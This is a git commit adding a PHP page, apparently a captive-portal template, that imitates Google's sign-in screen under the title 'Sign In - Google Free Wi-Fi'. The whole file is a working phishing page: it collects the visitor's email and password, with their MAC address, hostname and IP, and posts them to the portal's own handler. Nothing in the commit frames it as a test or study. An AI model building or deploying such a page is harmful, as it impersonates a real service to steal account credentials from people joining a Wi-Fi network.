60ee36d1cb3a162dc1a95ddac237a02f7a143145
Kleo Bercero <kbeflo@gmail.com>
2018-03-14 19:39:16 +0800

    Include google-login

---
+++ portals/google-login/index.php
@@ -0,0 +1,45 @@
+<?php
+$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
+require_once('helper.php');
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=394, user-scalable=no">
+<title>Sign In - Google Free Wi-Fi</title>
+<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+<link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>
+
+<script src="jquery-2.2.1.min.js"></script>
+<script type="text/javascript">
+  function redirect() {
+    setTimeout(function() {
+      window.location = "/captiveportal/index.php";
+    }, 100);
+  }
+</script>
+
+</head>
+<body>
+<form novalidate action="/captiveportal/index.php" method="POST" onsubmit="redirect()">
+	<img src="assets/img/1ckkcu79ho.gif" alt="">
+	<h1>Sign in</h1>
+	<h2>with your Google Account</h2>
+	<input id="user" type="text" name="email" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input type="password" name="password" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+	<input type="hidden" name="target" value="<?=$destination?>">
+	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
+	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
+</form>
+<footer>
+	English (United States) <img src="assets/img/mq40xx0kce.gif" alt="">
+	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
+</footer>
+<script>document.onload = function() { document.getElementById("user").focus();};</script>
+</body>
+</html>
